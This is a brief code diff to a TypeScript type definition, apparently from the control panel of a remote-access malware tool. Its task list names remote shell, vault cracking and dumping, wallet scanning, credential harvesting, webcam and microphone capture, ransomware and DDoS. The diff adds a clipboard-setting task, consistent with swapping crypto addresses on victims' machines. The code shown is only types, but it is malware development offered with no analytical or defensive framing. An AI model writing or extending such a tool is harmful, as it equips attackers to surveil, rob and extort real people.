@@ -13,7 +13,7 @@ export { versionAtLeast } from '../../server/lib/agent-compat';
 
 export type TaskName =
   | 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets'
-  | 'harvest' | 'screenshot' | 'clip_start' | 'clip_stop' | 'cancel' | 'agent'
+  | 'harvest' | 'screenshot' | 'clip_start' | 'clip_stop' | 'clip_set' | 'cancel' | 'agent'
   | 'monitor' | 'files' | 'webcam' | 'mic' | 'ransomware' | 'ddos';
 
 export type ActionGroupId =
